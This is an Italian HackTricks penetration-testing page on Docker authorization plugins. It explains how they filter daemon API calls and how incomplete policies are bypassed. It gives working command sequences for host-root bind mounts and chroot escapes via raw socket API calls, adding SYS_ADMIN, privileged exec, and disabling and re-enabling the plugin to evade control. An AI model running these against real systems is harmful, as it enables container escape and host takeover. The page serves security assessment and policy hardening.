# Plugin di autorizzazione a runtime

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

I plugin di autorizzazione a runtime sono un livello di policy aggiuntivo che decide se un caller può eseguire una data azione del daemon. Docker è l'esempio classico. Per impostazione predefinita, chiunque possa comunicare con il Docker daemon ha di fatto un ampio controllo su di esso. I plugin di autorizzazione cercano di restringere quel modello esaminando l'identità dell'utente autenticato e l'operazione API richiesta, quindi permettendo o negando la richiesta in base alla policy.

Questo argomento merita una pagina a sé perché cambia il modello di sfruttamento quando un attaccante ha già accesso a un'API Docker o a un utente nel gruppo `docker`. In tali ambienti la questione non è più solo "posso raggiungere il daemon?" ma anche "il daemon è protetto da un livello di autorizzazione e, in tal caso, quel livello può essere bypassato tramite endpoint non gestiti, parsing JSON debole o permessi di gestione dei plugin?"

## Funzionamento

Quando una richiesta raggiunge il Docker daemon, il sottosistema di autorizzazione può passare il contesto della richiesta a uno o più plugin installati. Il plugin vede l'identità dell'utente autenticato, i dettagli della richiesta, alcuni header selezionati e parti del body della richiesta o della risposta quando il content type è adeguato. Più plugin possono essere concatenati, e l'accesso è concesso solo se tutti i plugin permettono la richiesta.

Questo modello sembra solido, ma la sua sicurezza dipende interamente da quanto completamente l'autore della policy ha compreso l'API. Un plugin che blocca `docker run --privileged` ma ignora `docker exec`, perde chiavi JSON alternative come il top-level `Binds`, o permette l'amministrazione del plugin può creare un falso senso di restrizione lasciando comunque aperte vie dirette di escalation di privilegi.

## Obiettivi comuni dei plugin

Aree importanti da rivedere nella policy sono:

- container creation endpoints
- `HostConfig` fields such as `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode`, and namespace-sharing options
- `docker exec` behavior
- plugin management endpoints
- any endpoint that can indirectly trigger runtime actions outside the intended policy model

Storicamente, esempi come il `authz` plugin di Twistlock e plugin didattici semplici come `authobot` hanno reso questo modello facile da studiare perché i loro file di policy e i percorsi di codice mostravano come la mappatura endpoint-azione fosse effettivamente implementata. Per valutazioni offensive, la lezione importante è che l'autore della policy deve comprendere l'intera superficie dell'API e non solo i comandi CLI più visibili.

## Abuso

Il primo obiettivo è capire cosa viene effettivamente bloccato. Se il daemon nega un'azione, l'errore spesso leaks il nome del plugin, il che aiuta a identificare il controllo in uso:
```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```
Se hai bisogno di un profiling degli endpoint più ampio, strumenti come `docker_auth_profiler` sono utili perché automatizzano il compito altrimenti ripetitivo di verificare quali route API e strutture JSON siano realmente consentite dal plugin.

Se l'ambiente usa un plugin personalizzato e puoi interagire con l'API, enumera quali campi degli oggetti sono realmente filtrati:
```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```
Questi controlli sono importanti perché molte mancanze di autorizzazione dipendono dal singolo campo anziché dal concetto generale. Un plugin può rifiutare un pattern CLI senza bloccare completamente la corrispondente struttura API.

### Esempio completo: `docker exec` aggiunge privilegi dopo la creazione del container

Una policy che blocca la creazione di container privilegiati ma permette la creazione di container non confinati oltre a `docker exec` può ancora essere bypassata:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```
Se il daemon accetta il secondo step, l'utente ha recuperato un processo interattivo privilegiato all'interno di un container che l'autore della policy credeva fosse confinato.

### Esempio completo: Bind Mount Through Raw API

Alcune policy difettose ispezionano solo una singola forma JSON. Se il bind mount del filesystem root non viene bloccato in modo coerente, l'host può comunque essere montato:
```bash
docker version
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```
La stessa idea può apparire anche sotto `HostConfig`:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
http:/v1.41/containers/create
```
L'impatto è un full host filesystem escape. Il dettaglio interessante è che il bypass deriva da una copertura della policy incompleta piuttosto che da un bug del kernel.

### Esempio completo: Attributo Capability non controllato

Se la policy dimentica di filtrare un attributo relativo alle capability, l'attaccante può creare un container che riacquisisce una capability pericolosa:
```bash
curl --unix-socket /var/run/docker.sock \
-H "Content-Type: application/json" \
-d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```
Una volta che `CAP_SYS_ADMIN` o una capability altrettanto potente è presente, molte tecniche di breakout descritte in [capabilities.md](protections/capabilities.md) e [privileged-containers.md](privileged-containers.md) diventano raggiungibili.

### Esempio completo: Disabilitare il plugin

Se le operazioni di gestione dei plugin sono consentite, il bypass più pulito potrebbe essere disattivare completamente il controllo:
```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```
Questa è una falla di policy a livello di control plane. Il livello di autorizzazione esiste, ma l'utente che avrebbe dovuto essere limitato conserva ancora il permesso di disabilitarlo.

## Controlli

Questi comandi servono a identificare se esiste un livello di policy e se sembra essere completo o superficiale.
```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```
Cosa c'è di interessante qui:

- I messaggi di negazione che includono il nome di un plugin confermano un livello di autorizzazione e spesso rivelano l'implementazione esatta.
- Una lista di plugin visibile all'attaccante può essere sufficiente per scoprire se sono possibili operazioni di disabilitazione o riconfigurazione.
- Una policy che blocca solo azioni CLI ovvie ma non le richieste API raw dovrebbe essere considerata bypassabile finché non si dimostra il contrario.

## Runtime Defaults

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | Not enabled by default | Daemon access is effectively all-or-nothing unless an authorization plugin is configured | plugin policy incompleta, blacklists invece di allowlists, abilitazione della gestione dei plugin, punti ciechi a livello di field |
| Podman | Not a common direct equivalent | Podman typically relies more on Unix permissions, rootless execution, and API exposure decisions than on Docker-style authz plugins | esporre ampiamente una rootful Podman API, permessi deboli del socket |
| containerd / CRI-O | Different control model | These runtimes usually rely on socket permissions, node trust boundaries, and higher-layer orchestrator controls rather than Docker authz plugins | montare il socket nei workload, assunzioni di trust locale del nodo deboli |
| Kubernetes | Uses authn/authz at the API-server and kubelet layers, not Docker authz plugins | Cluster RBAC and admission controls are the main policy layer | RBAC troppo ampia, admission policy debole, esporre kubelet o runtime APIs direttamente |
{{#include ../../../banners/hacktricks-training.md}}
